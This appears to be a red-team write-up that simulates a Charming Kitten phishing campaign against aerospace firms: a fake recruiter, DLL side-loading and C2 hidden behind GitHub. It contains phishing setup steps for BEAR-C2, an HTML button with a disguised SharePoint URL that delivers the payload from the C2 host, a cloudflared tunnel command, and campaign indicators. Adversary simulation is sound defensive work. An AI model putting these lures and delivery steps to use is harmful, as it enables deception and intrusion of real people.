# Charming Kitten APT Adversary Simulation

This is a simulation of attack by (Charming Kitten) APT group targeting the aerospace, aviation, and defense industries across the Middle East, specifically Israel and the UAE, as well as possibly Turkey, India, and Albania. The campaign uses a fake job recruiting website called "Careers 2 Find" and a "Dream Job" social engineering lure to deliver "SnailResin" malware. The attack campaign has been active since at least September 2023 and was analyzed in late 2024. The attackers have relied on LinkedIn spoofing, ZIP archive delivery, and DLL Side-Loading for initial access and execution. The introduction of the SnailResin malware via a fake recruitment site represents a notable evolution toward high-level obfuscation, leveraging trusted platforms, and blending into legitimate cloud traffic. I relied on ClearSky Cyber Security to figure out the details to make this simulation: https://www.clearskysec.com/wp-content/uploads/2024/11/Iranian-Dream-Job-ver1.pdf

<img width="696" height="433" alt="imageedit_3_8766952404" src="https://github.com/user-attachments/assets/7f1b3742-ba5a-4d0a-8c5c-4d38b9a71b21" />



Throughout, the malware hides behind legitimate applications and cloud services to dodge static and dynamic detection, and the overall chain emphasizes low-noise execution with strong anti-analysis tricks built into the payload. This progression — LinkedIn recruiter lure → fake job website (careers2find[.]com) → malicious ZIP (SignedConnection[.]zip) → DLL Side-Loading (secur32.dll) → SnailResin malware → cloud-based C2 — shows Charming Kitten's shift toward more resilient, custom-built modular tooling and deliberate misattribution (mimicking North Korean Lazarus) in recent campaigns targeting aerospace and defense sectors.

![Charming Kitten Dream Job Attack Chain](https://quickchart.io/graphviz?graph=digraph%20G%20%7B%20rankdir%3DLR%3B%20node%20%5Bshape%3Dbox%2C%20style%3D%22rounded%2Cfilled%22%2C%20fontname%3D%22Arial%22%5D%3B%20A%5Blabel%3D%22LinkedIn%20Fake%20Recruiter%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20B%5Blabel%3D%22Fake%20Job%20Site%5C%2C%20careers2find.com%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20C%5Blabel%3D%22SignedConnection.zip%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20D%5Blabel%3D%22SignedConnection.exe%22%2C%20fillcolor%3D%22%23ccffcc%22%5D%3B%20E%5Blabel%3D%22Malicious%20secur32.dll%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20F%5Blabel%3D%22SnailResin%20Malware%22%2C%20fillcolor%3D%22%23ffcccc%22%5D%3B%20G%5Blabel%3D%22api.ipify.org%22%2C%20fillcolor%3D%22%23ccffcc%22%5D%3B%20H%5Blabel%3D%22GitHub%20README.html%22%2C%20fillcolor%3D%22%23ccffcc%22%5D%3B%20I%5Blabel%3D%22C2%20xboxapicenter.com%22%2C%20fillcolor%3D%22%23cce5ff%22%5D%3B%20J%5Blabel%3D%2289.221.225.249%22%2C%20fillcolor%3D%22%23cce5ff%22%5D%3B%20A-%3EB-%3EC-%3ED-%3EE-%3EF%3B%20F-%3EG%3B%20F-%3EH%3B%20H-%3EI-%3EJ%3B%20%7D)

**1. Delivery Technique:** Create a fake recruitment website (`careers2find[.]com`) and a LinkedIn recruiter profile to spear-phish targets in the aerospace industry, offering a "Dream Job" that leads them to download a malicious ZIP file (`SignedConnection[.]zip`).

**2. Malicious ZIP & DLL Side-Loading:** The ZIP file contains a legitimate application (`SignedConnection.exe`) alongside a malicious DLL (`secur32.dll`). When the executable is run, Windows DLL search order hijacking causes the malicious `secur32.dll` to be loaded instead of the legitimate one.

**3. SnailResin Malware:** The loaded DLL executes the SnailResin malware, which performs IP address discovery (via `api[.]ipify[.]org`) and fetches encoded C2 server information from a compromised GitHub account (`msdndegsupport`), hiding its infrastructure within legitimate cloud traffic.

**4. C2 infrastructure:** relies on GitHub (raw.githubusercontent.com) and Cloudflare to hide the real C2 servers. The malware uses ASCII-encoded data embedded in a README file to retrieve C2 configuration, communicating with domains like `xboxapicenter[.]com` and resolving to IPs like `89.221.225[.]249`.

---

## The first stage  (social engineering technique)

The attack kicks off with a spear-phishing campaign via LinkedIn. The threat actor TA455 creates fake recruiter profiles (e.g., "Tess Visser," "Adira Johnson," "Manon Roux") associated with a fabricated company called "Careers 2 Find." These profiles approach targets in the aerospace and aviation industries with a seemingly legitimate job offer for roles like "Aircraft Systems Design Manager."

<table>
  <tr>
    <td>
      <img width="633" height="483" alt="Screenshot From 2026-10-21 08-32-22" src="https://github.com/user-attachments/assets/4256a832-bea9-4444-bebf-9e2d874139ff" />
    </td>
    <td>
      <img width="804" height="421" alt="Screenshot From 2026-10-21 07-55-22" src="https://github.com/user-attachments/assets/915c2b4f-796c-40a8-9764-54f63dc3e571" />
    </td>
  </tr>
</table>

## The second stage Kill Chain (delivery technique)

The fake website `careers2find[.]com` is created, hiding its real IP under Cloudflare. The site contains a legitimate-looking job posting. When the victim engages, they are directed to download a PDF instruction file and a ZIP archive named `SignedConnection[.]zip`. The PDF provides step-by-step instructions on how to "safely" access the site, ensuring infection by guiding the user to extract the ZIP and run the `SignedConnection.exe` application.

<img width="1347" height="609" alt="Screenshot From 2026-10-21 08-19-25" src="https://github.com/user-attachments/assets/c4ece425-f4af-430c-87c2-ec337d7e6061" />

### Hosting the Phishing Page in BEAR-C2

Once started, the [**BEAR-C2**](https://github.com/S3N4T0R-0X0/BEAR) interface will display the fake job recruitment page (Careers2Find.html) in the victim's browser. The victim will see the "Aircraft Systems Design Manager" job posting. When they click the "Apply Now" button, the BEAR-C2 server logs the hit in the Traffic Logs and triggers the download of the next stage (SignedConnection.zip).

<img width="1366" height="665" alt="Screenshot From 2026-10-22 04-11-26" src="https://github.com/user-attachments/assets/7ced044f-5ad8-43dc-8b0f-a6f670750701" />


The Careers2Find.html file is hosted directly inside the Spear Phishing module of BEAR-C2.

To deploy it:

  1. Click Choose File Html and select Careers2Find.html.

  2. Set the URL Mask to careers2find (or a spoofed domain like careers2find[.]com).

  3. Click Start Server and copy the generated Phishing URL.


### Hosting and Delivering the Payload (BEAR-C2 Integration)

To complete the attack chain, the malicious ZIP file must be hosted on the [**BEAR-C2**](https://github.com/S3N4T0R-0X0/BEAR) server and linked directly to the "Apply Now" button on the fake recruitment website. This ensures a seamless transition from the phishing lure to the malware download.

<img width="1366" height="665" alt="Screenshot From 2026-10-22 04-24-38" src="https://github.com/user-attachments/assets/ae0332cb-28d9-4e07-8242-7a29c41c95ac" />


**Host the Malicious File**
Open the **Host File** module in BEAR-C2. 
* Select `SignedConnection.zip` using the **Choose File** button.
* Set the **URL Mask** to a trusted domain (e.g., `my.sharepoint.com/personal/file...`) to make the download link appear as a legitimate Microsoft SharePoint document.

```html
<button class="apply" style="cursor: pointer;" onclick="window.location.href = 'https://my.sharepoint.com/personal/file...@10.242.32.124:8080'">Apply Now</button>
```

**Result:**
When the victim visits the phishing page and clicks **"Apply Now"**, the browser is redirected to the BEAR-C2 server using the masked SharePoint URL. This immediately forces the download of `SignedConnection.zip`, initiating the DLL Side-Loading and SnailResin infection chain without raising immediate suspicion from URL filtering gateways.

## The third stage (Malicious ZIP and DLL Side-Loading)

**SignedConnection[.]zip Analysis:**
The ZIP file contains a mix of legitimate and malicious files. The main executable is `SignedConnection.exe`, which acts as a front-end GUI displaying a "Careers2Find" login prompt. Alongside it are legitimate DLLs (`msvcp140.dll`, `vcruntime140.dll`, etc.) and a malicious `secur32.dll`.

<img width="1280" height="648" alt="photo_2026-10-26_07-09-25" src="https://github.com/user-attachments/assets/4a2b0c7c-9ee3-4fab-bd14-01e5eefbe7b1" />

**Execution Flow:**
1. The victim extracts the ZIP and runs `SignedConnection.exe`.
2. The executable loads `secur32.dll` via DLL side-loading (search order hijacking).
3. The legitimate `secur32.dll` is replaced with a malicious version.
4. The malicious DLL executes the SnailResin malware in the context of the trusted `SignedConnection.exe` process.

### Mimic the attackers infrastructure by BEAR-C2

We initiated the BEAR C2 server and configured a new HTTPS listener named secur32. The listener was configured to use port 443, with the operator address set to the internal IP address 192.168.189.130. We reviewed the listener configuration, including the HTTP headers, user-agent, URI paths, and connection timing parameters, before starting the server.
The listener configuration established the communication parameters required for the subsequent payload-generation and connectivity-testing stages.

<img width="1280" height="586" alt="photo_2026-10-26_07-20-36" src="https://github.com/user-attachments/assets/5af128e3-a7a8-415d-a0f9-5e2ac435717d" />

We executed the following command to expose the local HTTPS listener through a temporary Cloudflare Tunnel:
cloudflared tunnel --url https://localhost:443 --no-tls-verify
The command created a publicly accessible HTTPS tunnel URL that forwarded incoming traffic to the local service listening on port 443. The generated URL was then used as the externally reachable endpoint for the subsequent connectivity test.
The terminal output confirmed that the quick tunnel was created. The --no-tls-verify option disabled certificate verification when cloudflared connected to the local HTTPS service, meaning the origin certificate was not validated.
This configuration allowed us to test external reachability without configuring a permanent Cloudflare Tunnel or a dedicated public IP address.

<img width="1354" height="409" alt="Screenshot From 2026-10-26 07-15-10" src="https://github.com/user-attachments/assets/50b6fce9-75f3-4c41-a323-1dddedfc5a4f" />




## The third stage (SnailResin malware and C2 retrieval)

SnailResin represents the main payload and the backbone of the entire adversarial operation in the Charming Kitten (TA455) attacks.

**1. ANTI-ANALYSIS & DISCOVERY**
The malware implements IP address discovery to assess the victim's location, using the legitimate service `api[.]ipify[.]org`.

**2. C2 CONFIGURATION RETRIEVAL**
Instead of hardcoding the C2 server, SnailResin fetches its configuration from a compromised GitHub account (`msdndegsupport`). It accesses `https://raw.githubusercontent.com/msdndegsupport/msdn/main/README.html` to download ASCII-encoded information.

The downloaded ASCII data (e.g., `120#98#111#120#97#112#105#99#101#110#116#101#114#46#99#111#109`) is decoded to reveal the C2 domain: `xboxapicenter[.]com`.

**3. C2 COMMUNICATION**
The malware communicates with C2 domains like `xboxapicenter[.]com` and `xboxplayservice[.]com`, resolving to IP addresses such as `89.221.225[.]249` (labeled "Stark Industries"). This blending with legitimate cloud traffic (Cloudflare, GitHub) allows the attackers to maintain a low profile.

![C2 Retrieval from GitHub](https://www.clearskysec.com/wp-content/uploads/2024/11/Iranian-Dream-Job-ver1.pdf)


## Pivoting technique

**Misattribution & False Flags:** TA455 deliberately mimics the North Korean Lazarus Group. They use the "Dream Job" lure (first used by Lazarus in 2020), similar attack techniques, and even malware files that overlap with Lazarus's DLL side-loading attacks. This causes antivirus engines to misattribute the malware to Kimsuky/Lazarus, creating confusion and hindering accurate attribution. The low AV detection rate (5/68) further highlights their evasion capabilities.

## MITRE ATT&CK Techniques

| Technique ID | Technique | Implementation |
|---------------|-----------|----------------|
| **T1566.001** | Phishing: Spearphishing Attachment | Malicious ZIP (`SignedConnection[.]zip`) delivered via LinkedIn recruiter. |
| **T1566.002** | Phishing: Spearphishing Link | Fake job website (`careers2find[.]com`) used as a lure. |
| **T1574.002** | Hijack Execution Flow: DLL Side-Loading | Malicious `secur32.dll` loaded by legitimate `SignedConnection.exe`. |
| **T1592** | Gather Victim Host Information | IP address discovery via `api[.]ipify[.]org`. |
| **T1102** | Web Service | Uses GitHub (`raw.githubusercontent.com`) to host encoded C2 configuration. |
| **T1090** | Proxy | Uses Cloudflare to hide the true IP of malicious domains. |
| **T1027** | Obfuscated Files or Information | ASCII-encoded C2 data in a GitHub README file. |
| **T1036** | Masquerading | Fake recruiter profiles, fake job website, and legitimate-looking application GUI. |
| **T1071.001** | Application Layer Protocol: Web Protocols | HTTP/HTTPS communication with C2 domains. |

